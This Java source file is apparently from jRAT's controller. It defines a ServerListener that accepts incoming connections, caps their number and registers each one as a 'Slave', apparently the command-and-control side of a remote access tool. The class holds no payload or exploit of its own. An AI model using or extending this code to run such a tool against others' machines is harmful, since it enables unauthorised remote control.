package jrat.controller.net;

import jrat.common.Logger;
import jrat.controller.Main;
import jrat.controller.Slave;
import jrat.controller.settings.Settings;

import java.net.Socket;

public class ServerListener extends PortListener implements Runnable {

	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
		super(name, port, timeout, pass, Settings.SocketType.SOCKET_NORMAL);
	}

	@Override
	public void run() {
		while (!server.isClosed()) {
			try {
				Socket socket = server.accept();

				try {
					int max = Settings.getGlobal().getInt(Settings.KEY_MAXIMUM_CONNECTIONS);

					if (max != -1 && Main.connections.size() > max) {
						Logger.warn("Maximum connections reached (" + max + "), closing...");
						socket.close();
						continue;
					}
				} catch (Exception ex) {
					ex.printStackTrace();
					Logger.err("Failed to check maximum connections: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
				}

				int type = socket.getInputStream().read();
				assert type == 0;

				new Slave(this, socket);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
